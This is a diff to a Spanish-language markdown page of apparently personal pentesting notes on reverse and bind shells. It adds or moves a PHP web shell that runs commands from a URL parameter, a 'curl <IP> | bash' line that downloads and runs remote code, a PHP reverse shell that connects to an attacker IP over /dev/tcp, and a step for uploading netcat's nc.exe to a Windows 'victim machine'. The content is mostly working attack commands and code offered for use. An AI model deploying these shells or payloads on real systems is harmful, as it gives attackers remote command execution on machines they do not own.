@@ -6,7 +6,7 @@ Tenemos diferntes tipos de [1 ReverShell](1%20ReverShell.md) en este pagina Web:
 
 ## ReverShell, BindShell
 Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
-```bash
+```php
 ❯ nano cmd.php
 	<?php 
 		echo "<prep>" . shell_exec($_GET['cmd']) . "</prep>";
@@ -23,10 +23,18 @@ Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?
 
 	# IP = IP de atacante
 	# 443 = Puerto a usar
+
+❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
 ```
 
-```bash
-❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
+ReverShell en php
+```php
+<?php
+   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
+?>
+
+	# IP = IP de atacante
+	# 443 = Puerto a usar
 ```
 
 Para ponernos en escucha por Netcat en espera de la **ReverShell**:
@@ -76,3 +84,9 @@ Debemos estar en la pestana de **Raw**
 ```
 
 
+### Binario para Windows
+
+Este .exe lo debemos de subir a la maquina victima en Windows
+```bash
+❯ /usr/share/Seclists/Web-Shells/FuzzDB/nc.exe           # Netcat .exe nos ayuda a conseguir una ReverShell en Windows
+```
